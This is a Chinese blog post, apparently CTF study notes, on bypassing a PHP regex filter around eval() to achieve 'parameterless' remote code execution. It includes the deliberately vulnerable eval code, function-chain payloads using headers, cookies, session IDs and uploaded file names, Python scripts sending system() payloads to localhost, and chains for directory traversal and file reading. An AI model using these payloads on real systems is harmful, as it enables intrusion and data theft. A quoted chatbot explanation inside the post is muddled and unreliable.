<!DOCTYPE html><html lang="en" theme-mode="dark"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>php无参数RCE | hybcx's blog</title><link rel="icon" type="image/x-icon" href="/favicon.ico"><script>var config = {"root":"/","search":{"preload":false,"activeHolder":"Enter here","blurHolder":"Search","noResult":"Data \"$0\" not found"},"code":{"codeInfo":"$0 - $1 lines","copy":"code.copy","copyFinish":"code.copyFinish","expand":"code.expand"}}</script><link rel="stylesheet" href="//unpkg.com/@waline/client@v2/dist/waline.css"><script src="//unpkg.com/mermaid@9.2.2/dist/mermaid.min.js"></script><link type="text/css" rel="stylesheet" href="//unpkg.com/lightgallery@2.7.1/css/lightgallery.css"><link type="text/css" rel="stylesheet" href="//unpkg.com/lightgallery@2.7.1/css/lg-zoom.css"><link type="text/css" rel="stylesheet" href="//unpkg.com/lightgallery@2.7.1/css/lg-thumbnail.css"><link type="text/css" rel="stylesheet" href="/lib/fontawesome/css/all.min.css"><link rel="stylesheet" href="/css/arknights.css"><script>if (window.localStorage.getItem('theme-mode') === 'light') document.documentElement.setAttribute('theme-mode', 'light')
if (window.localStorage.getItem('theme-mode') === 'dark') document.documentElement.setAttribute('theme-mode', 'dark')</script><style>@font-face {
 font-family: BenderLight;
 src: local('Bender'), url("/font/BenderLight.ttf");
}
@font-face {
 font-family: 'JetBrains Mono';
 src: local('JetBrains Mono'), url('/font/JetBrainsMono-Regular.woff2') format('woff2');
}</style><style>:root {
  --dark-background: url('https://ak.hypergryph.com/assets/index/images/ak/pc/bk.jpg');
  --light-background: url('/img/bk.jpg');
}</style><meta name="generator" content="Hexo 6.3.0"></head><body><div class="loading" style="opacity: 0;"><div class="loadingBar left"></div><div class="loadingBar right"></div></div><main><header class="closed"><nav><div class="navBtn"><i class="navBtnIcon"><span class="navBtnIconBar"></span><span class="navBtnIconBar"></span><span class="navBtnIconBar"></span></i></div><div class="navItem" id="search-header"><span class="navItemTitle"><input autocomplete="off" autocorrect="off" autocapitalize="none" placeholder="Search" spellcheck="false" maxlength="50" type="text" id="search-input"></span></div><div class="navItem" id="search-holder"></div><div class="search-popup"><div id="search-result"></div></div><ol class="navContent"><li class="navItem"><a class="navBlock" href="/"><span class="navItemTitle">Home</span></a></li><li class="navItem" matchdata="categories,tags"><a class="navBlock" href="/archives/"><span class="navItemTitle">Archives</span></a></li><li class="navItem"><a class="navBlock" href="/friends/"><span class="navItemTitle">Friends</span></a></li><li class="navItem"><a class="navBlock" href="/about"><span class="navItemTitle">About</span></a></li></ol></nav></header><div id="shadow-header"></div><article><div id="post-bg"><div id="post-title"><h1>php无参数RCE</h1><div id="post-info"><span>First Post: <div class="control"><time datetime="2023-10-16T10:55:25.215Z" id="date"> 2023-10-16</time></div></span><br><span>Last Update: <div class="control"><time datetime="2024-03-10T07:50:30.784Z" id="updated"> 2024-03-10</time></div></span><br><span>Word Count: <div class="control">7.8k</div></span><br><span>Read Time: <div class="control">32 min</div></span></div></div><hr><div id="post-content"><h1>0x01 前言</h1>
<p>本文是在做CTF比赛的时候遇到了无参数的RCE，之前也没遇见过这种知识点，故此来学习一番。不过搜寻了许多文章，感觉都是无头无尾的有点混乱，所以我这里也是在</p>
<h1>0x02 概述</h1>
<p>传统意义上，如果我们有</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">eval($_GET[&#x27;code&#x27;]);<br></code></pre></td></tr></table></figure>
<p>即代表我们拥有了一句话木马，可以进行getshell，例如</p>
<p class='item-img' data-src='image-20231019195043222.png'><img src="image-20231019195043222.png" alt="image-20231019195043222"></p>
<p><code>RCE</code>指的是远程命令执行，服务器后台可以执行<code>eval</code>等代码执行函数，而无参数<code>RCE</code>指的是传参的时候被过滤，我们只能让代码执行形如<code>a(b(c(d())))</code>的代码</p>
<h1>0x03 过滤场景</h1>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;var&#x27;</span>]))&#123;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-string">&#x27;;&#x27;</span> === <span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-string">&#x27;/[^\W]+\((?R)?\)/&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;var&#x27;</span>])) &#123;<br>        <span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/et|dir|na|info|dec|oct|pi|log/i&#x27;</span>, <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;var&#x27;</span>])) &#123;<br>               <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;var&#x27;</span>]);<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Sorry!&quot;</span>);<br>        &#125;<br>&#125;<br><span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-title function_ invoke__">show_source</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
<p>关键代码</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span>(<span class="hljs-string">&#x27;;&#x27;</span> === <span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-string">&#x27;/[^\W]+\((?R)?\)/&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;var&#x27;</span>])) &#123;<br>    <span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/et|dir|na|info|dec|oct|pi|log/i&#x27;</span>, <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;var&#x27;</span>])) &#123;<br>        <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;var&#x27;</span>]);<br>    &#125; <br>&#125;<br></code></pre></td></tr></table></figure>
<ul>
<li>首先分析外层正则表达式<code>[^\W]+\((?R)?\)</code></li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">`^`表示取反<br><br>`\W`代表匹配非字母、数字、下划线，等价于[^A-Za-z0-9_]<br><br>上面两点加一块，代表匹配所有字母数字下划线<br><br>`+`代表字母数字下划线匹配至少一个<br><br>`\(` `\)` 代表匹配括号本身<br><br>`(?R)`表示递归表达式本身<br><br>`(?R)?` 最后的`?`表示匹配1个或者0个表达式本身<br><br>综上：这个表达式其实就是匹配形如`a(b(c(d())));`的字符串，最终前面的字符串会被替换为&#x27;;&#x27;，于是可以返回true而跳到下一个if语句。<br></code></pre></td></tr></table></figure>
<ul>
<li>内层表达式<code>et|dir|na|info|dec|oct|pi|log</code></li>
</ul>
<p>输入的字符串不能包含<code>et、dir、na、info、dec、oct、pi、log</code>字符串</p>
<p><code>/i</code>表示忽略大小写，上面的黑名单字符串及时大小写也不能进行绕过</p>
<h1>0x04 绕过方法</h1>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;var&#x27;</span>]))&#123;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-string">&#x27;;&#x27;</span> === <span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-string">&#x27;/[^\W]+\((?R)?\)/&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;var&#x27;</span>])) &#123;<br>		<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;successful!&quot;</span>;<br>		<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;var&#x27;</span>]);<br>		&#125; <br>	<span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Sorry!&quot;</span>);<br>        &#125;<br>&#125;<br><span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-title function_ invoke__">show_source</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
<h2 id="4-1-getallheaders"><a href="#4-1-getallheaders" class="headerlink" title="4-1-getallheaders"></a>4.1 getallheaders()</h2>
<p class='item-img' data-src='image-20231016213022735.png'><img src="image-20231016213022735.png" alt="image-20231016213022735"></p>
<p>这里呢返回值是数字，失败返回false</p>
<p>以下的测试代码是：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">if</span> (<span class="hljs-string">&#x27;;&#x27;</span> === <span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-string">&#x27;/[^\W]+\((?R)?\)/&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;code&#x27;</span>])) &#123;<br>    <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;code&#x27;</span>]);<br>&#125;<br><span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-title function_ invoke__">show_source</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
<p>apache2环境下，函数返回所有请求头信息，这个是<code>apache</code>的函数</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>	<span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-title function_ invoke__">getallheaders</span>());<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
<p class='item-img' data-src='image-20231016201623717.png'><img src="image-20231016201623717.png" alt="image-20231016201623717"></p>
<p>如上图，其返回的是一些头部信息，我们可以抓包来自定义一些头部信息</p>
<p class='item-img' data-src='image-20231016203821949.png'><img src="image-20231016203821949.png" alt="image-20231016203821949"></p>
<p>取出我们自定义的头部信息</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>	<span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-title function_ invoke__">end</span>(<span class="hljs-title function_ invoke__">getallheaders</span>()));<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
<p class='item-img' data-src='image-20231016203842669.png'><img src="image-20231016203842669.png" alt="image-20231016203842669"></p>
<p>这样一来相当于我们将http header中的hybcx变成了我们的参数，可用其进行bypass无参数函数执行，如下图</p>
<p class='item-img' data-src='image-20231016204049031.png'><img src="image-20231016204049031.png" alt="image-20231016204049031"></p>
<p>这里又针对eval的问题做了一波探讨，这里我当初疑惑为何非要在传参的地方加上eval先执行一次，代码中不就有eval吗，为何这里需要套娃（但是传参的时候没有eval就不能成功执行phpinfo），于是询问了一波GPT，首先我们要清楚eval函数的参数必须是一个可执行的PHP代码，如果只是一个单纯的字符串时会报错无法执行的。</p>
<p>而这里我们如果只是传入end(getallheaders())，这两个函数的意思只是单纯的取出header头信息的最后一个元素，也就是一个数组操作，而这个，而我们的正则表达式是只会匹配：满足函数调用的参数内容，也就是需要前面是一个代码执行函数的意思，这里呢当然就是eval。emmm可能我说的不清楚，这里附上GPT回答，可能会好些：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">我明白你的疑虑。在PHP中，`end(getallheaders())` 不会被认为是函数调用，因为这个表达式仅返回`getallheaders()`的结果的最后一个元素，并没有直接调用函数。因此，它不包含函数调用，而是一个数组操作。<br><br>在你的示例中，确实只传入了 `end(getallheaders())` 而没有执行，因为它不满足条件检查的要求。我之前的回答中有一些混淆，我为此道歉。你的条件检查是基于正则表达式来查找包含函数调用的字符串，所以只有包含函数调用的字符串会满足条件。<br><br>如果你传入的参数中只包含 `end(getallheaders())`，它不会被认为是函数调用，因此不会执行 `eval()` 中的代码。<br><br>总之，你的示例代码要求 `$_GET[&#x27;code&#x27;]` 参数中包含有效的函数调用，才会执行 `eval($_GET[&#x27;code&#x27;])` 中的代码。 `end(getallheaders())` 不包含函数调用，因此不满足这个要求。<br></code></pre></td></tr></table></figure>
<p>回到正题，我们进一步获取<code>RCE</code></p>
<p class='item-img' data-src='image-20231016212802119.png'><img src="image-20231016212802119.png" alt="image-20231016212802119"></p>
<ul>
<li>非<code>apache</code>中间件-这里借用其他师傅的图了</li>
</ul>
<p class='item-img' data-src='image-20231016212837486.png'><img src="image-20231016212837486.png" alt="image-20231016212837486"></p>
<h2 id="4-2-get-defined-vars"><a href="#4-2-get-defined-vars" class="headerlink" title="4-2-get-defined-vars"></a>4.2 get_defined_vars()</h2>
<p class='item-img' data-src='image-20231016213051418.png'><img src="image-20231016213051418.png" alt="image-20231016213051418"></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>	<span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-title function_ invoke__">get_defined_vars</span>());<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
<p class='item-img' data-src='image-20231016213255596.png'><img src="image-20231016213255596.png" alt="image-20231016213255596"></p>
<p>可以回显的全局变量</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$_GET</span><br><span class="hljs-variable">$_POST</span><br><span class="hljs-variable">$_FILES</span><br><span class="hljs-variable">$_COOKIE</span><br></code></pre></td></tr></table></figure>
<p>尝试RCE</p>
<p class='item-img' data-src='image-20231016213725558.png'><img src="image-20231016213725558.png" alt="image-20231016213725558"></p>
<p class='item-img' data-src='image-20231016213818955.png'><img src="image-20231016213818955.png" alt="image-20231016213818955"></p>
<p>如上图我们end取到最后一个元素</p>
<p class='item-img' data-src='image-20231016213844304.png'><img src="image-20231016213844304.png" alt="image-20231016213844304"></p>
<p>eval直接执行</p>
<p class='item-img' data-src='image-20231016213900725.png'><img src="image-20231016213900725.png" alt="image-20231016213900725"></p>
<ul>
<li>如果服务器 对 <code>$_GET</code> <code>$_POST</code> <code>$_COOKIE</code> 进行了全局过滤，可以从 <code>$_FILES</code>下手</li>
</ul>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">from</span> io <span class="hljs-keyword">import</span> BytesIO<br><br>payload = <span class="hljs-string">&quot;system(&#x27;calc.exe&#x27;);&quot;</span>.encode(<span class="hljs-string">&#x27;hex&#x27;</span>)<br>files = &#123;<br>  payload: BytesIO(<span class="hljs-string">&#x27;hybcx&#x27;</span>)<br>&#125;<br><br>r = requests.post(<span class="hljs-string">&#x27;http://localhost/eval.php?var=eval(hex2bin(array_rand(end(get_defined_vars()))));&#x27;</span>, files=files, allow_redirects=<span class="hljs-literal">False</span>)<br>	<br><span class="hljs-built_in">print</span> r.content<br></code></pre></td></tr></table></figure>
<h2 id="4-3-session-id"><a href="#4-3-session-id" class="headerlink" title="4-3-session-id"></a>4.3 session_id()</h2>
<ul>
<li>php中对此函数的解释</li>
</ul>
<p class='item-img' data-src='image-20231016215917779.png'><img src="image-20231016215917779.png" alt="image-20231016215917779"></p>
<p>可以获取PHPSESSID的值，而我们知道PHPSESSID允许字母和数字出现，那么我们就有了新的思路，即<code>hex2bin</code></p>
<p>payload：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><br>payload = <span class="hljs-string">&quot;system(&#x27;calc.exe&#x27;);&quot;</span>.encode(<span class="hljs-string">&#x27;hex&#x27;</span>)<br>cookies = &#123;<br>  <span class="hljs-string">&#x27;PHPSESSID&#x27;</span>: payload<br>&#125;<br><br>r = requests.get(<span class="hljs-string">&#x27;http://localhost/eval.php?var=eval(hex2bin(session_id(session_start())));&#x27;</span>, cookies=cookies)<br><br><span class="hljs-built_in">print</span> r.content<br></code></pre></td></tr></table></figure>
<p>即可达成RCE和bypass的目的</p>
<h2 id="4-4-getenv"><a href="#4-4-getenv" class="headerlink" title="4-4-getenv"></a>4.4 getenv()</h2>
<p>查阅php手册，有非常多的超全局变量</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$GLOBALS</span><br><span class="hljs-variable">$_SERVER</span><br><span class="hljs-variable">$_GET</span><br><span class="hljs-variable">$_POST</span><br><span class="hljs-variable">$_FILES</span><br><span class="hljs-variable">$_COOKIE</span><br><span class="hljs-variable">$_SESSION</span><br><span class="hljs-variable">$_REQUEST</span><br><span class="hljs-variable">$_ENV</span><br></code></pre></td></tr></table></figure>
<p>我们可以使用<code>$_ENV</code>，对应函数为<code>getenv()</code></p>
<p class='item-img' data-src='image-20231019195234019.png'><img src="image-20231019195234019.png" alt="image-20231019195234019"></p>
<p>虽然<code>getenv()</code>可获取当前环境变量，但我们怎么从一个偌大的数组中取出我们指定的值成了问题</p>
<p>这里可以使用方法：</p>
<p class='item-img' data-src='image-20231019195339401.png'><img src="image-20231019195339401.png" alt="image-20231019195339401"></p>
<p>效果如下：</p>
<p class='item-img' data-src='image-20231019195911649.png'><img src="image-20231019195911649.png" alt="image-20231019195911649"></p>
<p>但我们要的是数组的值，那使用如下函数</p>
<p class='item-img' data-src='image-20231019200007448.png'><img src="image-20231019200007448.png" alt="image-20231019200007448"></p>
<p>两者结合便可以展示出值</p>
<p class='item-img' data-src='image-20231019200202048.png'><img src="image-20231019200202048.png" alt="image-20231019200202048"></p>
<p>我们则可用爆破的方式获取数组中任意位置需要的值，即，可使用getenv()，并获取指定位置的恶意参数</p>
<h2 id="4-5-目录操作相关"><a href="#4-5-目录操作相关" class="headerlink" title="4-5-目录操作相关"></a>4.5 目录操作相关</h2>
<ul>
<li>可以用相关函数进行目录遍历&amp;&amp;任意文件读取</li>
</ul>
<p>相关函数</p>
<ul>
<li><code>getcwd()</code>当前目录</li>
</ul>
<p class='item-img' data-src='image-20231016220203860.png'><img src="image-20231016220203860.png" alt="image-20231016220203860"></p>
<ul>
<li><code>scandir()</code> 目录扫描</li>
</ul>
<p class='item-img' data-src='image-20231016220319247.png'><img src="image-20231016220319247.png" alt="image-20231016220319247"></p>
<ul>
<li><code>dirname()</code> 目录穿越，这里实际上就是返回到了上级目录<img src="image-20231016220823827.png" alt="image-20231016220823827"></li>
</ul>
<p class='item-img' data-src='image-20231016220421631.png'><img src="image-20231016220421631.png" alt="image-20231016220421631"></p>
<ul>
<li><code>chdir()</code> 更改当前目录</li>
<li>读取上一层的特定文件</li>
</ul>
<p class='item-img' data-src='image-20231016222011790.png'><img src="image-20231016222011790.png" alt="image-20231016222011790"></p>
<p>这里没有复现成功，先借用其他师傅的图片了，感觉原因在于</p>
<p class='item-img' data-src='image-20231016222804839.png'><img src="image-20231016222804839.png" alt="image-20231016222804839"></p>
<p class='item-img' data-src='image-20231016222834646.png'><img src="image-20231016222834646.png" alt="image-20231016222834646"></p>
<p>这里感觉上述最后的复现很模糊不清楚，这里又找了几篇文章来学习</p>
<p>首先，我们可以利用<code>getcwd()</code>获取当前目录</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php">?code=<span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-title function_ invoke__">getcwd</span>());<br><br><span class="hljs-keyword">string</span>(<span class="hljs-number">13</span>) <span class="hljs-string">&quot;/var/www/html&quot;</span><br></code></pre></td></tr></table></figure>
<p>那么怎么进行当前目录的目录遍历呢？</p>
<p>这里用<code>scandir()</code>即可</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php">?code=<span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-title function_ invoke__">scandir</span>(<span class="hljs-title function_ invoke__">getcwd</span>()));<br><br><span class="hljs-keyword">array</span>(<span class="hljs-number">3</span>) &#123; [<span class="hljs-number">0</span>]=&gt; <span class="hljs-keyword">string</span>(<span class="hljs-number">1</span>) <span class="hljs-string">&quot;.&quot;</span> [<span class="hljs-number">1</span>]=&gt; <span class="hljs-keyword">string</span>(<span class="hljs-number">2</span>) <span class="hljs-string">&quot;..&quot;</span> [<span class="hljs-number">2</span>]=&gt; <span class="hljs-keyword">string</span>(<span class="hljs-number">9</span>) <span class="hljs-string">&quot;index.php&quot;</span> &#125;<br></code></pre></td></tr></table></figure>
<p>那么既然不在这一层目录，如何进行目录跳转呢？</p>
<p>我们用<code>dirname()</code>即可</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php">?code=<span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-title function_ invoke__">scandir</span>(<span class="hljs-title function_ invoke__">dirname</span>(<span class="hljs-title function_ invoke__">getcwd</span>())));<br><br><span class="hljs-keyword">array</span>(<span class="hljs-number">4</span>) &#123; [<span class="hljs-number">0</span>]=&gt; <span class="hljs-keyword">string</span>(<span class="hljs-number">1</span>) <span class="hljs-string">&quot;.&quot;</span> [<span class="hljs-number">1</span>]=&gt; <span class="hljs-keyword">string</span>(<span class="hljs-number">2</span>) <span class="hljs-string">&quot;..&quot;</span> [<span class="hljs-number">2</span>]=&gt; <span class="hljs-keyword">string</span>(<span class="hljs-number">14</span>) <span class="hljs-string">&quot;flag_phpbyp4ss&quot;</span> [<span class="hljs-number">3</span>]=&gt; <span class="hljs-keyword">string</span>(<span class="hljs-number">4</span>) <span class="hljs-string">&quot;html&quot;</span> &#125;<br></code></pre></td></tr></table></figure>
<p>那么怎么更改我们的当前目录呢？这里我们发现有函数可以更改当前目录</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">chdir ( string $directory ) : bool<br></code></pre></td></tr></table></figure>
<p>将 PHP 的当前目录改为 directory。<br>
所以我们这里在</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">dirname(getcwd())<br></code></pre></td></tr></table></figure>
<p>进行如下设置即可</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">chdir(dirname(getcwd()))<br></code></pre></td></tr></table></figure>
<p>我们尝试读取<code>/var/www/123</code></p>
<p class='item-img' data-src='image-20231019201247981.png'><img src="image-20231019201247981.png" alt="image-20231019201247981"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">http://localhost/?code=readfile(next(array_reverse(scandir(dirname(chdir(dirname(getcwd())))))));<br></code></pre></td></tr></table></figure>
<p class='item-img' data-src='image-20231019201318921.png'><img src="image-20231019201318921.png" alt="image-20231019201318921"></p>
<p>即可进行文件读取</p>
<h1>0x05 相关函数总结</h1>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">1. getcwd()：取得当前工作目录，成功则返回当前工作目录，失败返回 FALSE。<br><br>2. dirname()：返回路径中的目录部分，返回 path 的父目录。 如果在 path 中没有斜线，则返回一个点（’.‘），表示当前目录。否则返回的是把 path 中结尾的 /component（最后一个斜线以及后面部分）去掉之后的字符串(也就是上级目录的文件路径)。<br><br>3. chdir()：改变目录，成功时返回 TRUE， 或者在失败时返回 FALSE。<br><br>4. scandir()：列出指定路径中的文件和目录。成功则返回包含有文件名的数组，如果失败则返回 FALSE。如果 directory 不是个目录，则返回布尔值 FALSE 并生成一条 E_WARNING 级的错误。<br><br>5. array_flip()：交换数组中的键和值，成功时返回交换后的数组，如果失败返回 NULL。<br><br>6. array_rand()：从数组中随机取出一个或多个单元，如果只取出一个(默认为1)，array_rand() 返回随机单元的键名。 否则就返回包含随机键名的数组。 完成后，就可以根据随机的键获取数组的随机值。<br><br>7. localeconv()：返回一包含本地数字及货币格式信息的数组。而数组第一项就是 .<br></code></pre></td></tr></table></figure>
<h2 id="5-1-phpversion"><a href="#5-1-phpversion" class="headerlink" title="5-1-phpversion"></a>5.1 phpversion()</h2>
<ul>
<li><code>phpversion()</code>返回php版本，如<code>7.3.5</code></li>
<li><code>floor(phpversion())</code>返回<code>7</code></li>
<li><code>sqrt(floor(phpversion()))</code>返回<code>2.6457513110646</code></li>
<li><code>tan(floor(sqrt(floor(phpversion()))))</code>返回<code>-2.1850398632615</code></li>
<li><code>cosh(tan(floor(sqrt(floor(phpversion())))))</code>返回<code>4.5017381103491</code></li>
<li><code>sinh(cosh(tan(floor(sqrt(floor(phpversion()))))))</code>返回<code>45.081318677156</code></li>
<li><code>ceil(sinh(cosh(tan(floor(sqrt(floor(phpversion())))))))</code>返回<code>46</code></li>
<li><code>chr(ceil(sinh(cosh(tan(floor(sqrt(floor(phpversion()))))))))</code>返回<code>.</code></li>
<li><code>var_dump(scandir(chr(ceil(sinh(cosh(tan(floor(sqrt(floor(phpversion()))))))))))</code>扫描当前目录</li>
<li><code>next(scandir(chr(ceil(sinh(cosh(tan(floor(sqrt(floor(phpversion()))))))))))</code>返回<code>..</code></li>
</ul>
<p><strong>floor()</strong>：舍去法取整，<strong>sqrt()</strong>：平方根，<strong>tan()</strong>：正切值，<strong>cosh()</strong>：双曲余弦，<strong>sinh()</strong>：双曲正弦，<strong>ceil()</strong>：进一法取整</p>
<h2 id="5-2-crypt"><a href="#5-2-crypt" class="headerlink" title="5-2-crypt"></a>5.2 crypt()</h2>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">chr(ord(hebrevc(crypt(phpversion()))))`返回`.<br></code></pre></td></tr></table></figure>
<ul>
<li><code>hebrevc(crypt(arg))</code>可以随机生成一个hash值 第一个字符随机是 $(大概率) 或者 .(小概率) 然后通过ord chr只取第一个字符</li>
</ul>
<p><strong>crypt()</strong>：单向字符串散列，返回散列后的字符串或一个少于 13 字符的字符串，从而保证在失败时与盐值区分开来。</p>
